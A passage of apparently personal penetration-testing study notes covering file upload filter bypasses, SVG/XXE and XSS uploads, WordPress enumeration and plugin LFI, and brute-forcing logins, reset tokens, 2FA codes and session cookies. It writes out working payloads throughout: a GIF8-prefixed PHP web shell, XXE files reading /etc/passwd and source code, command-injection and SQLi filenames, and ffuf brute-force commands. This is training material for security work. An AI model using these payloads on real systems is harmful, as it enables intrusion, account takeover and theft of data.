Once this is determined, start **fuzzing the Content-Type Header** with seclists' **`Content-Type`** wordlist through **`Burp Intruder`** to see which types are allowed. If the error message specifies that only the images are allowed, limit the scan to image types:
```bash
cat SecLists/Discovery/Web-Content/web-all-content-types.txt | grep 'image/' > image-content-types.txt

```

Once this is done, intercept the upload request and fuzz the Content-Type header. If an image is successfully uploaded, modify the file content as well and resend the request. Now, visit the file and execute commands via the web shell or reverse shell. 

It is important to note that a file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). 
* It is usually only necessary to modify the file's Content-Type header. 
   
   * In some cases, the request will only contain the main Content-Type (if the uploaded content was sent as POST data). If happenes, the main Content-Type will need to be modified. 

<br>

**<u>MIME-Type</u>**

A more common type of file content validation is testing the uploaded file's MIME-Type. MIME is an internet standard that determines the type of a file through its general format and bytes structure. 

This is usually done by inspecting the first few bytes of the file's content, which contains the **File Signature** or **Magic Bytes.**
* If a file starts with `GIF87a` or `GIF89a`, this indicates that it is a GIF image, while a file starting with plaintext is usually considered a text file.
   * Many other image types have non-printable bytes for their file signatures, while a GIF image starts with ASCII printable bytes, so it is the easiest to imitate. Furthermore, as the string `GIF8` is common between both GIF signatures, it is usually enough to imitate a GIF image.

* If the first bytes of any file is changed to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension. 

If `GIF8` is written to the beginning of the file, it will be considered a GIF image, even if it has a different extension. Web servers can slo use this standard to determine file types, which is usually more accurate than testing the file extension. 
* MIME types are similar to the ones found in the Content-Type headers, but their source is different, as PHP uses the `mime_content_type()` function to get a file's MIME type. 

Once a requested is forwarded, notice whether there is an error message for uploading only images. If this is the case, add `GIF8` before the malicious script to try to imitate a GIF image while keeping the file extension as .ext, so it would execute the malicious code regardless. The following is an example of how this can be done with PHP:
```html
------WebKitFormBoundaryxxxxxxxxxxx
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/jpg

GIF8
<?php system($_REQUEST['cmd']); ?>

------WebKitFormBoundaryxxxxxxxxxxx--

```

If the file gets uploaded successfully, then visit the uploaded file and execute system commands. Note that the command output will start with GIF8, as it was the first line in the malicious script to imitate the GIF magic bytes. This will be outputted as plaintext before the malicious code is executed. 

A combination of the aforementioend methods can be combined to bypass more robust content filters:
* An **Allowed MIME type** with a **disallowed Content-Type**

* An **Allowed MIME and Content-Type** with a **disallowed extension**

<a id="fileuploadlimited"></a>

#### **`Limited File Uploads`**

While file upload forms with weak filters can be exploited to upload arbitrary files, some upload forms have secure filters that may not be exploitable with the aforementioend techniques. However, even when dealing with a limited file upload form, which allows only specific types of files to be uploaded, an attacker may still be able to perform some attacks on the web app. 
* Certain file types (`SVG`, `HTML`, `XML`, and some image and document files) may allow an attacker to introduce new vulnerabilities to the web app by uploading malicious versions of these files. 
   * This is why fuzzing allowed file extensions is crucial, as it enables attackers to explore what attacks are possible on the web server. 

**<u>XSS</u>**

Many file types may allow the introduction of a **Stored XSS** vulnerability to the web app by uploading maliciously crafted versions of them. The most basic example is when a web app allows users to upload HTML files. Although HTML files won't allow the execution of code, it would still be possible to implement JS code within them to carry an **XSS** or **CSRF** attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.

Another example of XSS attacks is web apps that display an image's metadata after its upload. For such web apps, an XSS payload can be included in one of the metadata parameters that accept raw text, like the Comment parameter:
```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' xss.jpg

```
If this command is done, the Comment parameter will be updated to the XSS payload. When the image's metadata is displayed, the XSS payload should be triggered, and the JS code will be executed to carry the XSS attack. Furthermore, if the image's MIME-Type is change to **`text/html`,** some web apps may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed. 

XSS attacks can also be carried with SVG images, along with several other attacks. SVG images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, their XML data can be modified to include an XSS payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>

```
Once the image is uploaded to the web app, the XSS payload will be triggered whenever the image is displayed. 

For any of these attacks, try any XSS payload that can lead to RCE. 

<br>

**<u>XXE</u>**

With SVG images, malicious XML data can be included to leak the source code of the web app, and other internal documents within the server. The following shows how XXE can be used with an SVG image to leak the content of `/etc/passwd`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

```
Once the above SVG image is uploaded and viewed, the XML document would get processed, and the attacker should get the info of `/etc/passwd` printed on the page or shown in the page source. Similarly, if the web app allows the upload of XML documents, then the same payload can carry the same attack when the XML data is displayed on the web app. 

While reading system files like `/etc/passwd` can be useful for server enumeration, it can have an even more significant benefit for web pentesting, as it allows the attacker to read the web app's source files. Access to the source code will enable attackers to find more vulnerabilities to exploit within the web app through **Whitebox Pentesting.** For file upload exploitation, it may allow an attacker to locate the upload directory, identify allowed extensions, or find the file naming scheme. 

To use XXE to read source code in PHP web apps, the following payload can be used within a malicious SVG image:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>

```

Once the SVG image is displayed, a base64 encoded version of index.php will be output, which can be decoded to read the source code. 

Using XML data is not unique to SVG images, as it is also used by many types of documents, like **PDF, Word, Powerpoint, etc;** all of these documents include XML data within them to specify their format and structure. An SSRF attack can also be conducted: an XXE vulnerability can be used to enumerate the internally available services or call private APIs to perform private actions. 

<br>

**<u>DoS</u>**

An XXE payload, in tandem with a file upload vulnerability, may be used to achieve DoS. Also, Decompression bombs with file types that use data compression, like ZIP archives can cause a DoS if the web app automatically unzips a ZIP archive. 

A **Pixel Flood** attack can be used with some image files that use image compression, like JPG or PNG. A JPG image file can be created with any image size, and then have its compression data modified to have a size of (0xffff x 0xffff), which woud result in an image with a size of 4 Gigapixels. When the web app tries to display this image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server. 

<a id="fileuploadother"></a>

#### **`Other Upload Attacks`**

A common file upload attack uses a **malicious string for the uploaded file name,** which may get executed or processed if the uploaded file name is displayed (reflected) on the page. Try injecting a command in the file name, and if the web app uses the file name within an OS command, it may lead to a **command injection attack.**
* If a file is named **`file$(whoami).jpg`,** **file\`whoami\`** or **`file.jpg||whoami`,** and the web app attempts to move the uploaded file with an OS command, then the file name would inject the whoami command, which would get executed and lead to RCE. 

* Try injecting an XSS payload in the filename. This may get which executed on the target's machine if the file name is displayed to them

* Inject an SQL query in the filename **(`file';select+sleep(5);--.jpg`).** THis may lead to an SQLi if the file name is insecurely used in an SQL query

<br>

**<u>Upload Directory Disclosure</u>**

In some file upload forms, like a feedback form or a submission form, there may not be access to the link of the uploaded file, making the uploads directory unknown. In such cases, use **fuzzing to look for the uploads directory** or even use other vulnerabilities (LFI, XXE) to find where the uploaded files are by reading the web app source code. 

Another method that can be used to disclose the uploads directory is through forcing error messages, as they often reveal information for further exploitation. One attack that can be used to cause such errors is uploading a file with a name that already exists or sending two identical requests simultaneously, which may lead the web server to show an error that it could not write the file and disclose the uploads directory. Also, try uploading a file with an overly long name (i.e., 5,000 characters); if the web app doesn't handle this correctly, it may also error out and disclose the upload fdirectory. 

<br>

**<u>Windows-specific Attacks</u>**

Use Windows-specific techniques, like using reserved characters (`|`, `<`, `>`, `*`, or `?`), which are usually reserverd for special uses like wildcards. If the web app does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. 

Try using Windows reserved names for the uploaded file name, like `CON`, `COM1`, `LPT1`, or `NUL`, which may cause an error as the web app will not be allowed to write a file with this name. 

Use the Windows 8.3 Filename Convention to overwrite existing files or refer to files that do not exist. Older versions of Windows were limited to a short length for file names, so they used `~` to complete the file name. 
* To refer to a file called file.txt, use `FIL~1.TXT` or `FIL~2.TXT`, where the digit represents the order of the matching files that start with FIL. As Windows still supports this convention, an attacker can write a file called `WEB~.CONF` to overwrite the web.conf file. 

* Also try to write a file that replaces sensitive system files. This can lead to causing information disclosure through errors, a DoS on the back-end server, or accessing private files.

### **`WordPress`**

Due to the customizability and extensible nature of WordPress, it is prone to vulnerabilities through third-party themes and plugins. WordPress is written in PHP and usually runs on Apache with MySQL as the backend. 


Wordpress, being a CMS, is made up of two key components:
* **Content Management Application (CMA):** The interface used to add and manage content
* **Content Delivery Application (CDA):** The backend that takes the input entered into the CMA and assembles the code into a working, visually appealing website. 

<a id="webattackwpstructureetroles"></a>

#### **`Structure and User Roles`**

WordPress requires a fully installed and configured LAMP stack (Linux OS, Apache HTTP Server, MySQL DB, and PHP programming language) before installation on a Linux host. After installation, all WordPress supporting files and directories will be accessible in the webroot located at **/var/www/html.** The following is the directory structure of a default WordPress install, showing the key files and subdirectories necessary for the website to function properly:
```bash
tree -L 1 /var/www/html
.
 index.php
 license.txt
 readme.html
 wp-activate.php
 wp-admin
 wp-blog-header.php
 wp-comments-post.php
 wp-config.php
 wp-config-sample.php
 wp-content
 wp-cron.php
 wp-includes
 wp-links-opml.php
 wp-load.php
 wp-login.php
 wp-mail.php
 wp-settings.php
 wp-signup.php
 wp-trackback.php
 xmlrpc.php

```
The root directory of WordPress contains files that are needed to configure WordPress to function correctly. 
* **`index.php`:** Homepage of WordPress

* **`license.txt`:** Contains useful information such as the version of WordPress installed

* **`wp-activate.php`:** Used for the email activation process when setting up a new WordPress site

* **`xmlrpc.php`:** This file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress REST API. 

* **`wp-config.php`:** Contains information required by WordPress to connect to the database, such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can be useful in troubleshooting. 

* **`wp-admin`:** This folder contains the login page for administrator access and the backend dashboard. Once a user has logged in, they can make changes to the site based on their assigned permissions. The login page can be located at one of the following paths, or can be renamed to make it more challenging to find the login page:
   * /wp-admin/login.php
   * /wp-admin/wp-login.php
   * /login.php
   * /wp-login.php

* **`wp-content`:** This folder is the main directory where plugins and themes are stored. The subdirectory **`uploads/`** is usually where any files uploaded to the platfotm are stored. These directories and files hsould be carefully enumerated as they may lead to contain sensitive data that could lead to RCE or exploitation of other vulnerabilities or misconfigurations.

* **`wp-includes`:** This folder contains everything except for the administrative components and the themes that belong to the website. This is the directory where core files are stored, such as certificates, fonts, JS files, and widgets. 

<br>

There are five types of users in a standard WordPress installation:

<center>

|Role|Description|
|----|-----------|
|**Administrator**|Has access to administrative features within the website. THis includes adding and deleting users and posts, as well as editing source code|
|**Editor**|Can publish and manage posts, including the posts of other users|
|**Author**|Can publish and manage their own posts|
|**Contributor**|Users that can write and manage their own posts but cannot publish them|
|**Subscriber**|Normal users who can browse posts and edit their profiles|

</center>

Gaining access as an administrator is usually needed to obtain code execution on the server; however, editors and authors may have access to certain vulnerable plugins that normal users do not

<a id="webattackwpenumversplugthemes"></a>

#### **`Enumeration: Version, Plugins, and Themes`**

An essential part of the enumeration phase is uncovering the software version number. This is helpful when searching for common misconfigurations such as default passwords that may be set for certain versions of an application and searching for known vulnerabilities for a particular version number. There are a variety of methods to discover the version number manually. The first and easiest step is **reviewing the page source code and looking for the generator tag.** Besides this, cURL can be used with the grep command to filter this information:
```bash
curl -s -X GET http://domain.com | grep '<meta name="generator"'

```
Aside from version information, the source code may also contain comments that may be useful. Links to CSS and JS can also provide hints about the version number. In older WordPress versions, another source for uncovering version information is the **`readme.html`** file in WordPress's root directory. 

<br>

Information can be sought out about the installed plugins by reviewing the source code manually by inspecting the page source or filtering for the information using cURL and other CLI utilities. The following commands can be used to gather information about the plugins and themes, respectively:
```bash
curl -s -X GET http:/domain.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

curl -s -X GET http://domain.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

```
The response headers may also contain version numbers for specific plugins; however, not all installed plugins and themes can be discovered passively. In some cases, requests have to be sent to the server to enumerate them. This can be done by sending a GET request that points to a directory or file that may exist on the server. If the directory or file exists, it may be directly accessible or a redirect response will be received from the webserver. More often than not, there will be no direct access to it. 
```bash
curl -I -X GET http://comain.com/wp-content/plugins/someplugin

```
To speed up enumeration, a bash script can be written, or a wfuzz or WPScan can be used to automate the process. 

<a id="webattackwpdirindexing"></a>

#### **`Enumeration: Directory Indexing`**

Active plugins should not be the only area of focus when assessing a WordPress website. Even if a plugin is deactivated, it still may be accessible, so the associated scripts and functions may be exploited. Deactivating a vulnerable plugin does not imporve the WordPress site's security. It is best practice to either remove or keep up any unused plugin up to date. 

Try navigating to a plugin directory through the web browser first. If not secure, the directory will show folders and files. This can also be done through cURL:
```bash
curl -s -X GET http://domain.com/wp-content/plugins/mail-masta/ | html2text

```
This type of access is called **`Directory Indexing`.** It allows attackers to navigate the folder and access files that may contain sensitive information and code. It is best practice to disable directory indexing on web servers so a potential attacker cannot gain direct access to any files or folders other than those necessary for the website to function properly.

<a id="webattackwpuserenum"></a>

#### **`Enumeration: Users`**

Enumerating a list of valid users is a critical phase of a WordPress security assessment. With a list of all users, attackers may be able to guess default credentials or perform a brute force password attack. If successful, the attacker may be able to log in to the WordPress backend as an author or even as an administrator. This access can potentially be leveraged to modify the WordPress website or even interact with the underlying web server. There are **two methods for performing manual username enumeration:**

**1. Reviewing Posts**

By reviewing posts, the IDs assigned to the user and their corresponding username can be uncovered. This can be done by leaving the mouse over the post author link. A link to the user's account will then appear in the web browser's lower-left corner. 

The **admin user is usually assigned the user ID 1.** This can be confirmed by specifying the user ID for the author parameter in the URL or using cURL, as seen below:
```bash
http://domain.com/?author=1

curl -s -I http://domain.com/?author=1
```
The cURL request will redirect the attacker to the user's profile page or the main login page; look at the **Location** field. If the user does not exist, a 404 Not Found error will be output. 

<br>

**2. Interact with the JSON Endpoint**

By interacting with the JSON endpoint, a list of users can be obtained; however, this was changed in WordPress core after **version 4.7.1.** Later versions only show whether a user is configured or not. Before this release, all users who had published a post were shown by default:
```bash
curl http://domain.com/wp-json/wp/v2/users | jq
```

<a id="webattackwploginenum"></a>

#### **`Enumeration: Login`**

Once a list of valid users have been obtained, a password brute-forcing attack can be attempted to gain access to the WordPress backend. This attack can be performed via the login page or the xmlrpc.php page. 

The following POST request can be used against the xmlrpc page; if the credentials are not valid, a 403 response will be received:
```xml
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://domain.com/xmlrpc.php

```
Before going onto the next section, it is crucial to understand the importance of manual methods before using automated tools. Automated tools can speed up the pentesting process, but may generate problems on the web server. A solid understanding of manual enumeration methods will also help with troubleshooting in case the automated tools do not work or provide unexpected output.

<a id="webattackwpwpscan"></a>

#### **`Enumeration: WPScan`**

WPScan is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a WordPress site are outdated or vulnerable. It can be installed with gem, if it is not installed:
```bash
gem install wpscan
```
Once the installation completes, run the help menu command (`-hh`) to see the available CLI switches. There are many enumeration options that can be specified, such as vulnerable plugins, all plugins, user enumeration, etc. It is important to understand all of the options available and fine tune the scanner depending on the goal. WPScan can pull in vulnerability information from external sources to enhance the scans. 
* An API token can be obtained from [WPScan](https://wpscan.com/), which is used by WPScan to scan for vulnerability and exploit PoCs and reports. 
   * This token can then be supplied to WPScan using the `--api-token` parameter

The `--enumerate` flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, users, media, and backups; however, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments `--enumerate ap`. It is important to note that the default number of threads used is 5, but can be chaned through the `-t` flag. 


A good first scan to run with WPScan is the following:
```bash
wpscan --url http://domain.com --enumerate --api-token [API token]
```

<a id="webattackwpexpplug"></a>

#### **`Exploitation: Vulnerable Plugin`**

If using WPScan, look through the generated report to find the vulnerable plugins or outdated themes. If manually searching, be diligent about researching the used plugins and themes.

To demonstrate a vulnerable plugin, consider the Mail Masta plugin version 1.0, which is vulnerable to SQLi and LFI. This exploit enables unauthenticated users to read local files through the following path:
```html
/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd.

```
This can be leveraged by using the web browser and viewing the source, or using cURL:
```bash
view-source:http://domain.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

curl http://domain.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

<a id="webattackwpexpusers"></a>

#### **`Exploitation: Attacking Users`**

After obtaining a username list, WPScan can be used to brute force usernames and passwords. The tool uses two kinds of login brute force attacks `xmlrpc` and `wp-login`.

<a id="brokenauthentication"></a>

### **`Broken Authentication`**

The most widespread authentication method in web applications is login forms, where users enter their username and password to prove their identity. Authentication is the first defense against unauthorized access. While systems can implement different authentication methods, they can typically be divided into the following three major categories:
* **`Knowledge-Based Authentication`:** Relies on something the user knows to prove their identity. The user provides information such as passwords, passphrases, PINs, or answers to security questions.
   * This authentication method suffers from reliance on static personal information that can be potentially obtained, guessed, or brute-forced.

* **`Ownership-Based Authentication`:** Relies on something the user possesses. The user proves their identity by proving the ownership of a physical object or device, such as ID cards, security tokens, or smartphones with authentication apps. 
   * This authentication method is vulnerable to physical attacks, like stealing or cloning the object, as well as cryptographic attacks on the algorithm it uses

* **`Inherence-Based Authentication`:** Relies on something the user is or does. This includes biometric factors like fingerprints, facial patterns, and voice recognition, or signatures. Biometric authentication is highly effective since biometric traits are inherently tied to an individual user. 
   * This authentication method must address concerns regarding privacy, data security, and potential biases in biometric recognition algorithms to ensure widespread adoption and trust among users. This can be irreversibly compromised in the event of a data breach

<a id="brokenauthbfusers"></a>

#### **`User Enumeration Vulnerabilities`**

User enumeration vulnerabilities arise when a web application responds differently to registered/valid and invalid inputs for authentication endpoints. User enumeration vulnerabilities frequently occur in functions based on the user's username, such as user login, user registration, and password reset. 

Web developers frequently overlook user enumeration vectors, assuming that information such as usernames is not confidential; however, usernames can be considered confidential if they are the primary identifier required for authentication in web applications. Moreover, users tend to use the same username across various services other than web applications, including FTP, RDP, and SSH. Since many web applications allow attackers to identify usernames, valid usernames can be enumerated and used for further attacks on authentication. 

<br>

Protection against username enumeration attacks can have an impact on user experience. **A web application revealing whether a username exists may help a legitamate user identify that they failed to type their username correctly.** Still, the same applies to an attacker trying to determine valid usernames. Even well-known and mature applications, like WordPress, allow for user enumeration by default. User enumeration is not always a security vulnerability; nevertheless, it should be avoided if possible as a defense-in-depth measure. 
* For instance, if an attacker attempts to login to WordPress ith an invalid username, they will get a particular message
* If an attacker attempts to login to WordPress with a valid username, they will get a different error message. 


To obtain a list of valid usernames, an attacker typically requires a wordlist of usernames to test. Usernames are often far less complicated than passwords. They rarely contain special characters when they are not email addresses. A list of common users allows an attacker to narrow the scope of a brute-force attack or carry out targeted attacks against support employees or users. Also, a common password could be easily sprayed against valid accounts, often leading to a successful account compromise. Fuzzing tools and wordlists can be leveraged to find valid users. 
```bash
ffuf -w /seclists/Usernames/xato-net-10-million-usernames.txt -u http://domain.com/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
In this case, the `-d` parameter represents POST data, and the `-fr` parameter filters out responses when the corresponding string is output from the fuzz scan. 

<br>

While differences in the web application's response are the simplest and most obvious way to enumerate valid usernames, it may also be possible to enumerate valid usernames via side channels. **`Side Channel`** attacks fo not directly target the web application's response but rather extra information that can be obtained or inferred from the response. 
* An example of a side channel is the response timing; the time it takes fro the web application's response to reach the end-user. 

<a id="brokenauthbfpasswords"></a>

#### **`Brute Forcing Passwords`**

After identifying valid users, password-based authentication relies on the password as a sole measure for authenticating the user. Since users tend to select an easy password, attackers may be able to guess or brute-force it. The following examples describe how to brute-force a password-based login form, as it is one of the most common examples of broken authentication. 

One prominent issue is password reuse, where individuals use the same password across multiple accounts. This practice poses a significant security risk because if one account is compromised, attackers can potentially gain access to other accounts with the same credentials. This enables an attacker who obtained a list of passwords from a password leak to try the same passwords on other web applications via password spraying. Another issue is weak passwors based on typical phases, dictionary words, or simple patters. These passwords are vulnerable to brute-force attacks, where automated tools systematically try different combinations until they find the correct one, compromising the account's security. 

The success of a brute-force attack depends on the number of attempts an attacker can perform and the amount of time the attack takes. As such, ensuring that a good wordlist is used for the attack is crucial. In some cases, password requirements will be shown to a user when creating an account. An attacker can leverage this by filtering password lists to meet the requirements. The following example filters rockyou to include at least one uppercase letter, at least one lowercase letter, at least one digit, and at least 10 characters:
```bash
grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

```
Of course, a valid list of users will also be needed to start brute-forcing passwords. If one user is already known, that user can be specified so that only the password will be brute forced. Before this is done, intercept the login request to know the names of the POST parameters and the error message returned with the response. In this case, upon providing an incorrect username, the login response contains the string "Invalid username." This can be used to form the ffuf command to brute-force the user's password:
```bash
areqma_1@htb[/htb]$ ffuf -w custom_wordlist.txt -u http://domain.com/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

<a id="brokenauthbfpassresettokens"></a>

#### **`Brute Forcing Password Reset Tokens`**

Many web applications implement a password-recovery functionality if a user forgets their password. This password-recovery functionality typically relies on a one-time reset token, which is transmitted to the user, for instance, via SMS or email. The user can then authenticate using this token, enabling them to reset their password and access their account. As such, a weak password-reset token may be brute-forced or predeicted by an attacker to take over a victim's account. 

Reset tokens (in the form of a code or temporary password) are secret data generated by an application when a user requests a password reset. The user can then change their password by presenting the reset token. Since password reset tokens enable an attacker to reset an account's password without knowledge of the password, they can be leveraged as an attack vector to take over a victim's account if implemented incorrectly. Password reset flows can be complicated because they consist of several sequential steps. 


To identify weak reset tokens, an account typically needs to be created on the target web application. Then, a password reset token must be requested to be analyzed. Sometimes, the password reset link will contain the reset token in the GET parameter token. In some cases, it will only be a 4 digit number, so there can only be 10,000 possible values. If this is true, user accounts can be hijacked by requesting a password reset and brute forcing the token. The following example brute forces all possible reset tokens by first creating a wordlist of all possible tokens from 0000 to 9999:
```bash
seq -w 0 9999 > tokens.txt

```
Assuming that there are users currently in the process of resetting their passwords, try to brute-force all active reset tokens. To target a specific user, send a password reset request for that user first to create a reset token. Then, specify the wordlist in ffuf to brute force all active reset tokens:
```bash
ffuf -w tokens.txt -u http://domain.com/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```
By specifying the reset token in the GET parameter token in the /reset_password.php endpoint, the password of the corresponding account can be reset, enabling an attacker to take over the account. 

<a id="brokenauthbf2facodes"></a>

#### **`Brute Forcing 2FA Codes`**

2FA is often achieved by combining knowledge-based authentication (password) with ownership-based authentication; however, 2FA can also be achieved by combining any other two of the major three authentication categories. Therefore, 2FA makes it significantly more difficult for attackers to access an account even if they manage to obtain the user's credentials. By requiring users to provide a second form of authentication, such as a one-time code generated by an authenticator app or sent via SMS, 2FA mitigates the risk of unauthorized access. This extra layer of security significantly enhances the overall security posture of an account, reduing the likelihood of successful account breaches. 

One of the most common 2FA implementations relies on the user's password and a time-based one-time password (TOTP) provided to the user's smartphone by an authenticator app or via SMS. These TOTPs typically consist only of digits, making them potentially guessable if the length is insufficient and the web application does not implement measures against successive submission of incorrect TOTPs. 

Like reset tokens, this 2FA codes can be cracked, but the corresponding request needs to be seen to prepare the parameters to fuzz. In this example, the TOTP is passed in the otp POST parameter. Also, the session token in the PHPSESSID cookie needs to be specified to associate the TOTP with the authenticated session. In this case, the TOTP is a 4 digit number:
```bash
seq -w 0 9999 > tokens.txt

ffuf -w tokens.txt -u http://domain.com/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```
There may be many hits because if session successfully passed the 2FA check after supplying the correct TOTP: use the first hit. Afterward, the session will be marked as fully authenticated, so all requests using the session cookie are redirected to /admin.php in this case. 

<a id="brokenauthvulnpwreset"></a>

#### **`Vulnerable Password Reset`**

If a web application uses rate limiting and CAPTCHAs, business logic bugs within the password reset functionality can allow taking over other users' accounts. Often, web applications authenticate users who have lost their passwords by requesting that they answer one or multiple security questions. During registration, users provide answers to predefined and generic security questions, disallowing users from entering custom onesl therefore, within the same web application, the security wuestions of all users will be the same, allowing attackers to abuse them. 

Assume a vulnerable password reset was found on a target website. Often, the weak link in a question-based password reset functionality is the predictability of the answers. While these questions seem tied to the individual user, they can often be obtained through OSINT or guessed, given a sufficient number of attempts; i.e., a lack of brute force protection. The answer can be brute forced with a proper word list. In these cases, set up the corresponding ffuf command from the request to brute force the answer. Keep in mind that the session cookie needs to be kept to associate the request with the username:
```bash
ffuf -w city_wordlist.txt -u http://domain.com/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```
After obtaining the security response, reset the user's password and entirely take over the account. 

<br>

Another instance of a flawed password reset logic occurs when a user can manipulate a potentially hidden parameter to reset the password of a different account. Consider the following situation in a password reset form:
1. Specify the username
2. Supply the response to the security question 
   * Intercept the request before submitting. The username may be contained in the form as a hidden parameter and sent along with the security response
3. Reset the user's password

In step 3, the request may contain the username in a separate POST parameter. If the web application properly verifies that the usernames in both requests match, the security question can be skipped or it can be answered, then the password of an entirely different account can be set. For instance, the admin user's password can be changed by manipulating the username parameter of the password reset request. 

To prevent this vulnerability, keeping a consistent state during the entire password reset process is essential. Resetting an account's password is a sensitive process where minor implementation flaws or logic bugs can enable an attacker to take over other users' accounts. As such, investigate the password reset functionality of any web application.

#### **`Authentication Bypass via Direct Access`**

The most straightforward way of bypassing authentication checks is to request the protected resource directly from an unauthenticated context. An unauthenticated attacker can access protected information if the web application does not properly verify that the request is authenticated.

In this case, assume that the web application redirects users to the /admin.php enpoint after successful authentication, providing protected information only to authenticated users. If the web application relies solely on the login page to authenticate users, the protected resource can be accessed directly through the /admin.php endpoint. While this scenario is uncommon, a slight variant occasionally happens in vulnerable web applications. To show this vulnerability, assume the web application uses the following snippet of PHP code to verify whether a user is authenticated:
```php
if(!$_SESSION['active']) {
	header("Location: index.php");
}

```
This code redirects the user to /index.php if the session is not active; i.e., if the user is not authenticated. However, the PHP script does not stop execution, resulting in protected information within the page being sent in the response body. Essentially, the contents of the /admin.php webpage can be seen in the response body by sending a request to that endpoint; however, if this is attempted on a web browser, the browser follows the redirect and displays the login prompt instead of the protected admin page. **This can be bypassed by intercepting the response and changing the status code from 302 to 200.** To do this:
1. Enable Intercept in Burp
2. Browse to the /admin.php endpoint in the web browser
3. Right-click on the request and select Do intercept > Response to this request to intercept the response
4. Forward the request by clicking forward
5. Edit the intercepted response: change the status code from 302 Found to 200 OK
6. Forward the response and switch back to the browser window to see if the protected page is rendered. 

To prevent the protected information from being returned in the body of the redirect response, the PHP script needs to exit after isssuing the redirect:
```php
if(!$_SESSION['active']) {
	header("Location: index.php");
	exit;
}
```

#### **`Attacking Session Tokens`**

Vulnerabilities related to authentication can arise not only from implementation of the authentication itself but also from the handling of session tokens. Session tokens are unique identifiers a web application uses to identify a user. More specifically, the session token is tied to the user's session. If an attacker can obtain a valid session token of another user, the attacker can impersonate the user to the web application, thus taking over their session. 

Suppose a session token does not provide sufficient randomness and is cryptographically weak. In that case, valid session tokens can be brute forced. This can happen if a session token is too short or contain static data that does not provide randomness to the token; i.e., the token provides insufficient entropy. For instance, consider a web application that assigns a token consisting of hardcoded prepended and appended values, while only a small part of the session token is dynamic to provide randomness. 

Assume a session token is 32 characters long; thus, it seems infeasible to enumerate other users' valid sessions. However, send the login request multiple times and take note of the session tokens assigned by the web application. If all the session tokens are similar, that indicates that it consists of a static string followed by a prepended/appended string. This would reduce the effective randomness of the session tokens, clearly. At this point, active sessions can be hijacked by brute forcing the values. 
* In other cases, the session identifier can be incremented

It is crucial to capture multiple session tokens and analyze them to ensure that session tokens provide sufficient randomness to disallow brute force attacks against them. In a more realistic scenario, the session token provides sufficient randomness on the surface; however, the generation of session tokens is never truly random. It can be predicted by an attacker with insight into the session token generation logic. The simplest form of predictable session tokens contains encoded data that can be tampered with. Start by analyzing the encoded data, and then try to decode it:
```bash
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d

```
In many cases, the cookie value will contain information about the user and the role tied to the session. There may not be any security measures in place that prevent the attacker from tampering with the data. Try forging a session token by manipulating the data and encode it to match the expected format:
```bash
echo -n 'user=nameduser;role=admin' | base64

```
Then, send this cookie to the web application to obtain administrative access. The same exploit works for cookies containing differently encoded data. Keep an eye out for data in hex-encoding or URL-encoding. For instance, a session token containing hec-encoded data can be encoded again with the following command:
```bash
echo -n 'user=nameduser;role=admin' | xxd -p

```
Another variant of session tokens contains the result of an encryption of a data sequence. A weak cryptographic algorithm could lead to privilege escalation or authentication bypass, just like plain encoding. Improper handling of cryptographic algorithms or injection of user-provided data into the input of an encryption function can lead to vulnerabilities in the session token generation; however, it is often challenging to attack encryption-based session tokens in a balck box approach without access to the source code responsible for session token generation.

<a id="brokenauthothersessattcks"></a>

#### **`Other Session Attacks`**

